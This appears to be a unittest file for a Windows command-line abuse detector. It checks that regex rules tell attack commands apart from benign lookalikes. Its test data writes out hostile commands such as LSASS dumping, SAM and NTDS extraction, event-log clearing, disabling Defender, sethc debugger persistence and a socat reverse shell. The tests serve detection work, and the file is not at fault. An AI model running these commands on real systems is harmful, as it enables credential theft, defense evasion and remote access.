"""Behavior distinctions and false matches; command strings are never executed."""
from collections import Counter
from pathlib import Path
import tempfile
import unittest

from sklearn.feature_extraction.text import CountVectorizer

from src.config import FEATURE_VERSION, feature_version
from src.features.label_generators import RegexLabelGenerator
from src.features.pipeline import WindowsFeaturePipeline
from src.features.rules_constants import WINDOWS_BEHAVIOR_REGEX_LIST
from src.preprocessing.tokenizer import extract_executable_tokens


class WindowsBehaviorTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = RegexLabelGenerator(WINDOWS_BEHAVIOR_REGEX_LIST, 'windows')

    def test_reviewed_behaviors_are_distinguishable(self):
        # Explicit contrasting behavior, including the nine previous collision groups.
        pairs = [
            (r'cscript //e:vbscript C:\lab\file.txt:script.vbs',
             r'cscript "C:\Program Files\Microsoft Office\Office16\ospp.vbs" /dstatus'),
            ('git -c core.fsmonitor="cmd.exe /c calc.exe" status',
             'git -c core.quotepath=false for-each-ref'),
            ('net stop "Windows Defender Antivirus Service"', 'net stop MySQL80'),
            ('python -c "exec(base64.b64decode(data))"', 'python -X importtime -c "import asyncio"'),
            (r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe',
             r'reg add HKLM\Software\MyCo /v Path /d App'),
            (r'reg save HKLM\SAM C:\backup\sam.hiv', r'reg save HKLM\Software\MyCo AppBkUp.hiv'),
            (r'reg export HKLM\Software\MyCo C:\lab\file.txt:data.reg',
             r'reg export HKLM\Software\MyCo C:\backup\app.reg'),
            ('regsvr32 /s /u /i:file.sct scrobj.dll', 'regsvr32 /s Softpub.dll'),
            ('wevtutil cl Security', 'wevtutil gl Security'),
            ('wevtutil sl Security /e:false', 'wevtutil sl Security /e:true'),
            ('procdump -ma lsass.exe output.dmp', 'procdump -ma notepad.exe output.dmp'),
            (r'wuauclt /UpdateDeploymentProvider C:\Users\Public\provider.dll /RunHandlerComServer', 'wuauclt /detectnow'),
            ('bitsadmin /SetNotifyCmdLine job cmd.exe NULL', 'bitsadmin /resume job'),
            (r'certutil -decode input.txt C:\Temp\output.exe', r'certutil -decode input.txt C:\Temp\output.txt'),
            (r'MavInject.exe 3110 /INJECTRUNNING C:\Users\Public\module.dll', 'mavinject 4321 /INJECTRUNNING'),
            ('fltmc unload SysmonDrv', 'fltmc load vsepflt'),
            ('ntdsutil "ac i ntds" ifm "create full c:\\temp" quit quit', 'ntdsutil files integrity'),
            ('msdt /id PCWDiagnostic /param "IT_BrowseForFile=/../../$(calc).exe"', 'msdt.exe -id WindowsUpdateDiagnostic'),
            (r'wmic process get brief /format:"\\10.20.30.40\lab\sample.xsl"',
             'wmic process get brief /format:table'),
        ]
        with tempfile.TemporaryDirectory() as directory:
            corpus = Path(directory) / 'empty.corpus'
            corpus.write_text('', encoding='utf-8')
            pipeline = WindowsFeaturePipeline(str(corpus))
            analyze = CountVectorizer().build_analyzer()
            for abuse, ordinary in pairs:
                with self.subTest(abuse=abuse):
                    lhs = Counter(analyze(' '.join(pipeline(abuse, training=True))))
                    rhs = Counter(analyze(' '.join(pipeline(ordinary, training=True))))
                    self.assertNotEqual(lhs, rhs)

    def test_aliases_case_paths_and_command_wrapper(self):
        commands = [
            ('wevtutil clear-log Security', 'win_eventlog_clear'),
            ('echo marker & wevtutil cl Security', 'win_eventlog_clear'),
            ('WEVTUTIL.EXE sl Security /enabled:false', 'win_eventlog_disable'),
            (r'"C:\Windows\System32\wevtutil.exe" cl Security', 'win_eventlog_clear'),
            (r'NET1.EXE stop WinDefend', 'win_defense_service_stop'),
            (r'reg save "HKEY_LOCAL_MACHINE\SECURITY" C:\backup\security.hiv', 'win_reg_sensitive_hive'),
            (r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /d "0" /v "EnableLUA"', 'win_reg_protection_disable'),
            (r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /d 0', 'win_reg_protection_disable'),
            (r'certutil -hashfile C:\Users\Public\data.bin SHA256', 'win_certutil_hash'),
            (r'dnscmd dc1 /config /serverlevelplugindll \\10.20.30.40\lab\sample.dll', 'win_dns_plugin_dll'),
            (r'cmd.exe - < C:\Users\Public\file.txt:payload.bat', 'win_cmd_ads_io'),
            (r'regini newfile.txt:hidden.ini', 'win_ads_argument'),
        ]
        for command, expected in commands:
            with self.subTest(command=command):
                self.assertIn(expected, self.rules(command))
        with tempfile.TemporaryDirectory() as directory:
            corpus = Path(directory) / 'empty.corpus'
            corpus.write_text('', encoding='utf-8')
            labels = WindowsFeaturePipeline(str(corpus))('cmd /c wevtutil clear-log Security', training=True)
            self.assertIn('win_eventlog_clear', labels)

    def test_ordinary_operations_do_not_match_abuse_features(self):
        examples = [
            ('echo "wevtutil cl Security"', 'win_eventlog_clear'),
            ('echo "text & wevtutil cl Security"', 'win_eventlog_clear'),
            (r'cmd /c echo "text < C:\Users\Public\file.txt:payload.bat"', 'win_cmd_ads_io'),
            ('notwevtutil cl Security', 'win_eventlog_clear'),
            ('wevtutil gl Security', 'win_eventlog_clear'),
            ('wevtutil sl Security /e:true', 'win_eventlog_disable'),
            ('wevtutil sl Security /e:falsehood', 'win_eventlog_disable'),
            ('wevtutil sl Security /e:false\nwevtutil gl System', 'win_eventlog_clear'),
            ('regsvr32 /s Softpub.dll', 'win_regsvr32_scriptlet'),
            ('regsvr32 /i:file.sct ordinary.dll', 'win_regsvr32_scriptlet'),
            ('regsvr32 /i:http://example.com:8080/file.sct scrobj.dll', 'win_ads_argument'),
            (r'reg save HKLM\Software\MyCo C:\backup\app.hiv', 'win_reg_sensitive_hive'),
            (r'reg save HKLM\SAMOther C:\backup\data.hiv', 'win_reg_sensitive_hive'),
            (r'reg export HKLM\SYSTEM\CurrentControlSet\Services C:\backup\services.reg', 'win_reg_sensitive_hive'),
            ('procdump -ma notepad.exe lsass.dmp', 'win_credential_process_dump'),
            ('procdump -ma lsass.dmp output.dmp', 'win_credential_process_dump'),
            ('procdump -ma 1234 output.dmp', 'win_credential_process_dump'),
            ('wuauclt /RunHandlerComServer', 'win_wuauclt_custom_provider'),
            (r'wuauclt /DeploymentHandlerFullPath C:\Windows\System32\UpdateDeploy.dll /RunHandlerComServer', 'win_wuauclt_custom_provider'),
            ('certutil -decode input.exe output.txt', 'win_certutil_decode_code'),
            ('certutil -hashfile sample.exe SHA256', 'win_certutil_decode_code'),
            (r'ssh -o PKCS11Provider=C:\Windows\System32\provider.dll host', 'win_ssh_remote_pkcs11'),
            ('mavinject 4321 /INJECTRUNNING', 'win_mavinject_custom_library'),
            ('fltmc unload MyApplicationFilter', 'win_security_filter_unload'),
            ('fltmc load SysmonDrv', 'win_security_filter_unload'),
            ('ntdsutil files integrity', 'win_ntds_ifm_export'),
            ('msdt.exe -id DeviceDiagnostic', 'win_troubleshooter_expression'),
            (r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /d 1', 'win_reg_protection_disable'),
            (r'reg add HKLM\Software\MyCo /v EnableLUA /d 0', 'win_reg_protection_disable'),
            ('git -c core.fsmonitor=true status', 'win_git_shell_callback'),
            ('git switch -c feature', 'win_git_shell_callback'),
            ('python -c "import base64;print(base64.b64decode(data))"', 'win_python_exec_base64'),
            ('python -c "exec(code)"', 'win_python_exec_base64'),
            ('net stop WinDefendBackup', 'win_defense_service_stop'),
        ]
        for command, absent in examples:
            with self.subTest(command=command):
                self.assertNotIn(absent, self.rules(command))

    def test_feature_schema_is_platform_specific(self):
        self.assertEqual(feature_version('linux'), FEATURE_VERSION)
        self.assertNotEqual(feature_version('windows'), FEATURE_VERSION)
        with self.assertRaises(ValueError):
            feature_version('macos')

    def test_good_only_tool_counterparts_have_behavior_features(self):
        cases = [
            ('msiexec /i https://example.org/package.png /q', 'win_msiexec_disguised_web_package'),
            ('msiexec /q /package "https://example.org/package.PNG?download=1"', 'win_msiexec_disguised_web_package'),
            (r'odbcconf /s /a {regsvr \\fileserver\share\library.txt}', 'win_odbcconf_remote_registration'),
            (r'schtasks /create /tn Example /tr "\"regsvr32.exe\" /s /n /u /i:https://example.org/file.sct scrobj.dll" /sc daily', 'win_schtasks_remote_scriptlet'),
            ('bash.exe -c "socat tcp-connect:192.0.2.1:4444 exec:sh,pty"', 'win_bash_socat_shell'),
        ]
        for command, expected in cases:
            with self.subTest(command=command):
                self.assertIn(expected, self.rules(command))

    def test_same_tools_ordinary_arguments_are_not_abuse_evidence(self):
        cases = [
            ('msiexec /i https://example.org/agent.msi /qn', 'win_msiexec_disguised_web_package'),
            ('msiexec /i https://example.org/agent.png.msi /qn', 'win_msiexec_disguised_web_package'),
            ('msiexec /i agent.msi LOGO=https://example.org/logo.png', 'win_msiexec_disguised_web_package'),
            ('msiexec /x https://example.org/agent.png', 'win_msiexec_disguised_web_package'),
            (r'odbcconf /a {REGSVR C:\Windows\System32\oleaut32.dll}', 'win_odbcconf_remote_registration'),
            ('odbcconf /F my.rsp', 'win_odbcconf_remote_registration'),
            ('schtasks /create /tn Example /tr "notepad.exe" /sc daily', 'win_schtasks_remote_scriptlet'),
            ('schtasks /create /tn "regsvr32 /i:https://example.org/file.sct scrobj.dll" /tr "notepad.exe" /sc daily', 'win_schtasks_remote_scriptlet'),
            ('bash -c "echo socat tcp-connect:192.0.2.1:4444 exec:sh,pty"', 'win_bash_socat_shell'),
            ('bash -c "socat tcp-connect:192.0.2.1:4444 -"', 'win_bash_socat_shell'),
            ('bash -c "echo hello"', 'win_bash_socat_shell'),
            ('echo "msiexec /i https://example.org/file.png"', 'win_msiexec_disguised_web_package'),
        ]
        for command, absent in cases:
            with self.subTest(command=command):
                self.assertNotIn(absent, self.rules(command))

    def test_wsh_script_execution_positions(self):
        self.assertEqual(extract_executable_tokens(r'cscript //nologo C:\Windows\pubprn.vbs Server1 LDAP://example', 'windows'), ['cscript', 'pubprn.vbs'])
        self.assertEqual(extract_executable_tokens(r'wscript.exe //E:VBScript script.vbs certutil.exe', 'windows'), ['wscript.exe', 'script.vbs'])
        self.assertEqual(extract_executable_tokens('echo cscript pubprn.vbs', 'windows'), ['echo'])
        self.assertEqual(extract_executable_tokens('cscript fake.exe', 'windows'), ['cscript'])
        self.assertEqual(extract_executable_tokens('cscript.vbs other.vbs', 'windows'), ['cscript.vbs'])
        self.assertEqual(extract_executable_tokens('cscript script.vbs & certutil -hashfile data.bin SHA256', 'windows'), ['cscript', 'script.vbs', 'certutil'])

    def test_netsh_helper_alert_policy_uses_action_and_dll_location(self):
        positive = [
            r'netsh.exe add helper C:\Windows\Temp\file.dll',
            r'netsh.exe add helper c:\temp\nethelp.dll',
            r'netsh.exe add helper C:\Users\User\file.dll',
            r'"C:\Windows\System32\netsh.exe" ADD HELPER "C:\Users\Some User\AppData\Local\Temp\helper.DLL"',
            r'netsh add helper %TEMP%\helper.dll',
            r'netsh add helper %SystemRoot%\Temp\helper.dll',
        ]
        negative = [
            r'netsh add helper C:\dlls\HelperDLL.dll',
            r'netsh add helper C:\Windows\System32\authfwcfg.dll',
            r'netsh delete helper C:\Windows\Temp\file.dll',
            r'netsh show helper',
            r'netsh add helper C:\Windows\Temporary\file.dll',
            r'netsh add helper C:\Windows\Temp\file.dll.txt',
            r'netsh add helper C:\Windows\Temp\notes.txt file.dll',
            r'netsh add helper "C:\Windows\Temp\file.dll.txt"',
            r'echo "netsh add helper C:\Windows\Temp\file.dll"',
        ]
        feature = 'win_netsh_helper_risky_location'
        for command in positive:
            with self.subTest(command=command):
                self.assertIn(feature, self.rules(command))
        for command in negative:
            with self.subTest(command=command):
                self.assertNotIn(feature, self.rules(command))
        with tempfile.TemporaryDirectory() as directory:
            corpus = Path(directory) / 'empty.corpus'
            corpus.write_text('', encoding='utf-8')
            pipeline = WindowsFeaturePipeline(str(corpus))
            labels = pipeline(r'cmd /c netsh add helper C:\Windows\Temp\file.dll', training=True)
            self.assertIn(feature, labels)
            analyze = CountVectorizer().build_analyzer()
            lhs = Counter(analyze(' '.join(labels)))
            rhs = Counter(analyze(' '.join(pipeline(negative[0], training=True))))
            self.assertNotEqual(lhs, rhs)

    def test_wsh_handling_does_not_apply_to_linux(self):
        self.assertEqual(extract_executable_tokens('cscript script.vbs', 'linux'), ['cscript'])
        self.assertEqual(extract_executable_tokens('cat script.vbs', 'linux'), ['cat'])

    def test_alert_policy_modes_differ_from_ordinary_same_tool_operations(self):
        cases = [
            (r'at 09:00 /interactive notepad.exe', r'at 09:00 backup.cmd', 'win_at_interactive_job'),
            (r'cdb -cf script.wds -o notepad.exe', r'cdb -QR Server', 'win_cdb_command_mode'),
            ('InstallUtil /logfile= /LogToConsole=false /U app.dll', 'InstallUtil /LogFile= app.dll', 'win_installutil_logging_suppressed'),
            (r'vshadow -nw -exec=C:\tools\callback.exe C:', 'vshadow -q', 'win_vshadow_execution_callback'),
            ('hh.exe http://example.org/help.chm', r'hh.exe C:\Help\app.chm', 'win_hh_remote_resource'),
            (r'remote /s "\\server\share\app.exe" session', 'remote /c server2 MyBrokenBox', 'win_remote_server_execution'),
            (r'replace \\server\share\app.exe C:\out /A', r'replace a:\phones.cli c:\ /s', 'win_replace_add_files'),
            ('dotnet-trace collect -- hello.exe arg1', 'dotnet-trace collect --process-id 1902', 'win_dotnet_trace_child'),
        ]
        with tempfile.TemporaryDirectory() as directory:
            corpus = Path(directory) / 'empty.corpus'
            corpus.write_text('', encoding='utf-8')
            pipeline = WindowsFeaturePipeline(str(corpus))
            analyze = CountVectorizer().build_analyzer()
            for alert, ordinary, feature in cases:
                with self.subTest(alert=alert):
                    self.assertIn(feature, self.rules(alert))
                    self.assertNotIn(feature, self.rules(ordinary))
                    lhs = Counter(analyze(' '.join(pipeline(alert, training=True))))
                    rhs = Counter(analyze(' '.join(pipeline(ordinary, training=True))))
                    self.assertNotEqual(lhs, rhs)

    def test_alert_policy_flags_have_boundaries(self):
        cases = [
            ('at 09:00 /interactivex app.exe', 'win_at_interactive_job'),
            ('cdb --config script.wds', 'win_cdb_command_mode'),
            ('InstallUtil /LogFile=app.log /LogToConsole=false app.dll', 'win_installutil_logging_suppressed'),
            ('InstallUtil /LogFile= /LogToConsole=falsehood app.dll', 'win_installutil_logging_suppressed'),
            ('InstallUtil /LogToConsole=true /LogFile= app.dll', 'win_installutil_logging_suppressed'),
            ('vshadow -execOther=app.exe C:', 'win_vshadow_execution_callback'),
            ('hh -decompile output local.chm', 'win_hh_remote_resource'),
            ('remote /status', 'win_remote_server_execution'),
            ('replace files C:\\out /another', 'win_replace_add_files'),
            ('dotnet-trace collect --duration 00:00:01', 'win_dotnet_trace_child'),
            ('dotnet-trace collect-linux -- hello.exe', 'win_dotnet_trace_child'),
            ('dotnet-trace collect --providers "text -- hello.exe"', 'win_dotnet_trace_child'),
            ('echo "cdb -cf script.wds"', 'win_cdb_command_mode'),
        ]
        for command, absent in cases:
            with self.subTest(command=command):
                self.assertNotIn(absent, self.rules(command))
        self.assertIn('win_installutil_logging_suppressed', self.rules('InstallUtil /U app.dll /LogToConsole=false /LogFile='))
        self.assertIn('win_dotnet_trace_child', self.rules('dotnet-trace collect --duration 00:00:01 -- "C:\\Program Files\\App\\app.exe"'))


class PowerShellBehaviorTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        corpus = Path(self.directory.name) / 'empty.corpus'
        corpus.write_text('', encoding='utf-8')
        self.pipeline = WindowsFeaturePipeline(str(corpus))

    def labels(self, command):
        return set(self.pipeline(command, training=True))

    def test_powershell_invocations_through_normal_entry_point(self):
        import base64

        cases = [
            ('Import-Module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\test\\fun.dll;[Program]::Fun()',
             'win_powershell_load_assembly_path'),
            ('Import-Module .\\UtilityFunctions.ps1; RegSnapin "C:\\Test Dir\\module.dll";[Program.Class]::Main()',
             'win_powershell_register_snapin'),
            ('Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\script.ps1 -Out .\\image.png -Image .\\source.jpg',
             'win_powershell_script_to_image'),
        ]
        for script, expected in cases:
            encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
            for command in (
                f'powershell.exe -NoProfile -Command "{script}"',
                f'pwsh -EncodedCommand {encoded}',
                f'cmd /c powershell -Command "{script}"',
            ):
                with self.subTest(command=command):
                    self.assertIn(expected, self.labels(command))

    def test_names_in_data_and_incomplete_invocations_do_not_match(self):
        commands = [
            'powershell -Command "Write-Output \'RegSnapin C:\\Temp\\sample.dll\'"',
            'powershell -Command "Write-Output \'text;LoadAssemblyFromPath sample.dll\'"',
            'powershell -Command "Import-Module .\\Invoke-PSImage.ps1"',
            'powershell -Command "Invoke-PSImage -Script input.ps1 -OutputDirectory out"',
            'powershell -Command "OtherRegSnapin module.dll"',
            'powershell -Command "RegSnapin module.dll.txt"',
            'powershell -File C:\\Scripts\\RegSnapin.ps1',
            'powershell -Command "Export-StartLayout -Path \'C:\\ProgramData\\Layout\\check\'"',
            'powershell -NoProfile Get-AppxPackage Microsoft.MinecraftUWP',
        ]
        for command in commands:
            with self.subTest(command=command):
                labels = self.labels(command)
                self.assertFalse(any(label.startswith('win_powershell_') for label in labels))
                self.assertNotIn('sc_remote', labels)
                self.assertNotIn('sc_start', labels)

    def test_disabling_defense_service_differs_from_application_configuration(self):
        feature = 'win_sc_defense_service_disable'
        for command in (
            'sc config WinDefend start= disabled',
            r'"C:\Windows\System32\sc.exe" config "WinDefend" start=disabled',
            r'cmd /c sc \\server config Sense type= own start= disabled',
        ):
            self.assertIn(feature, self.labels(command))
        for command in (
            'sc config WinDefend start= auto',
            'sc config MyApplication start= disabled',
            'sc config WinDefendBackup start= disabled',
            'sc config WinDefend start= disabledExtra',
            'sc config aTrustService type= own',
            'sc delete MongoDB',
            'echo "sc config WinDefend start= disabled"',
        ):
            self.assertNotIn(feature, self.labels(command))

    def test_ssh_loopback_shell_is_distinct_from_ordinary_ssh(self):
        feature = 'win_ssh_loopback_shell'
        for command in (
            r'ssh localhost "cmd /c c:\windows\system32\calc.exe"',
            r'ssh.exe 127.0.0.1 "cmd.exe /c calc.exe"',
            r'ssh ::1 "cmd /c calc.exe"',
            r'ssh [::1] "cmd /c calc.exe"',
            r'cmd /c ssh localhost "cmd /c calc.exe"',
        ):
            self.assertIn(feature, self.labels(command))
        for command in (
            'ssh -f host xterm',
            'ssh localhost',
            'ssh localhost "whoami"',
            'ssh localhost.example.com "cmd /c calc.exe"',
            'echo \'ssh localhost "cmd /c calc.exe"\'',
        ):
            self.assertNotIn(feature, self.labels(command))

    def test_sc_features_preserve_actual_service_control_commands(self):
        for command in (
            r'sc.exe \\server start MyService',
            r'"C:\Windows\System32\sc.exe" \\server start MyService',
            r'cmd /c sc \\server start MyService',
        ):
            with self.subTest(command=command):
                self.assertTrue({'sc_remote', 'sc_start_remote', 'sc_start'} <= self.labels(command))
        self.assertIn('sc_start', self.labels('sc start MyService'))
        for command in ('sc query MyService', r'echo "sc \\server start MyService"'):
            self.assertFalse({'sc_remote', 'sc_start_remote', 'sc_start'} & self.labels(command))


if __name__ == '__main__':
    unittest.main()
